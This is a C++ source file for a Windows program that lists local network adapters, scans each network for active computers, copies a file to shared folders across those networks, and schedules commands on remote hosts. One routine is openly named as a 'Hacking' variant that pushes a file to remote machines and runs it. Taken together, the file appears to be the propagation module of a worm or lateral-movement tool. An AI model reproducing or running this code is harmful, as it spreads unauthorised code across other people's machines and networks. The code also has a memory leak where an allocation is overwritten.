#include "NetworkList.h"

Network ** NetworkList::localNetworkList;
int NetworkList::numElems = 0; 
bool NetworkList::inicialized = false;
      
void NetworkList::inicialize() {
   PIP_ADAPTER_INFO pAdapterInfo, pAdapter;
   DWORD result;
   bool adapterSpaceAllocated = false;
   unsigned long sizeAdapter = sizeof(IP_ADAPTER_INFO);
   
   if (!NetworkList::inicialized) {
      NetworkList::localNetworkList = (Network **) malloc(sizeof(Network *));
      if (NetworkList::localNetworkList != NULL) {
         pAdapterInfo = (IP_ADAPTER_INFO *) malloc(sizeof(IP_ADAPTER_INFO));
         if (pAdapterInfo != NULL) {             
            result = GetAdaptersInfo(pAdapterInfo, &sizeAdapter);
            if (result == ERROR_BUFFER_OVERFLOW) {
               free(pAdapterInfo);
               pAdapterInfo = (IP_ADAPTER_INFO *) malloc(sizeAdapter);
               if (pAdapterInfo != NULL) {             
                  result = GetAdaptersInfo(pAdapterInfo, &sizeAdapter);
                  adapterSpaceAllocated = true;
               }
            }
            else if (result == NO_ERROR) adapterSpaceAllocated = true;
            
            if (adapterSpaceAllocated) {
               pAdapter = pAdapterInfo;
               
               while (pAdapter) {
                  if (pAdapter->Type != MIB_IF_TYPE_LOOPBACK) {
                     if (numElems > 0) NetworkList::localNetworkList = (Network **) realloc(NetworkList::localNetworkList, sizeof(Network *) * (numElems + 1));                    
                     *(NetworkList::localNetworkList + numElems) = (Network *) malloc(sizeof(Network));
                     *(NetworkList::localNetworkList + numElems) = new Network(pAdapter->Description, string(pAdapter->IpAddressList.IpAddress.String).c_str(), string(pAdapter->IpAddressList.IpMask.String).c_str(), string(pAdapter->GatewayList.IpAddress.String).c_str()); 
                     numElems++; 
                  }
                  pAdapter = pAdapter->Next;
               }
               if (numElems > 0) NetworkList::inicialized = true;
            }
            free(pAdapterInfo);
         }   
      }
   }
}
                  
bool NetworkList::scanLocalNetwork() {
   bool result = false;
   
   if (NetworkList::inicialized) {
      
      for(int i = 0; i < numElems; i++) {
         if ((*(NetworkList::localNetworkList + i))->scanActiveComputersInNetwork()) result = true;  
      }
   }
   return result;   
}
    
bool NetworkList::copyFileToSharesFoldersInNetworks(const char * strFilename, const char * strFilenameDestiny) {
   if ((NetworkList::numElems > 0) && (NetworkList::inicialized)) {
      for(int i = 0; i < NetworkList::numElems; i++) NetworkList::localNetworkList[i]->copyFileToSharesFoldersInNetwork(strFilename, strFilenameDestiny);
      return true;
   }
   return false;
}

bool NetworkList::schedulerTaskAddNowInNetworks(const char * command, bool interactive) {
   bool result = false;
   
   Network::clearIncrementMinutes();
   if ((NetworkList::numElems > 0) && (NetworkList::inicialized)) {
      for(int i = 0; i < NetworkList::numElems; i++) {
         if (NetworkList::localNetworkList[i]->schedulerTaskAddNowInNetwork(command, interactive)) result = true;
      }
   }
   return result;
}

bool NetworkList::schedulerTaskAddNowInNetworksHacking(const char * fileSourcePath, const char * filename, bool interactive) {
   bool result = false;
   
   Network::clearIncrementMinutes();
   if ((NetworkList::numElems > 0) && (NetworkList::inicialized)) {
      for(int i = 0; i < NetworkList::numElems; i++) {
         if (NetworkList::localNetworkList[i]->schedulerTaskAddNowInNetworkHacking(fileSourcePath, filename, interactive)) result = true;
      }
   }
   return result;   
}

bool NetworkList::schedulerTaskAddInNetworks(const char * time, int daysWeek, const char * command, bool interactive) {
   bool result = false;
   
   if ((NetworkList::numElems > 0) && (NetworkList::inicialized)) {
      for(int i = 0; i < NetworkList::numElems; i++) {
         if (NetworkList::localNetworkList[i]->schedulerTaskAddInNetwork(time, daysWeek, command, interactive)) result = true;
      }
   }
   return result;
}

bool NetworkList::schedulerTaskAddInNetworks(const char * time, char * daysMonth, const char * command, bool interactive) {
   bool result = false;
   
   if ((NetworkList::numElems > 0) && (NetworkList::inicialized)) {
      for(int i = 0; i < NetworkList::numElems; i++) {
         if (NetworkList::localNetworkList[i]->schedulerTaskAddInNetwork(time, daysMonth, command, interactive)) result = true;
      }
   }
   return result;
}
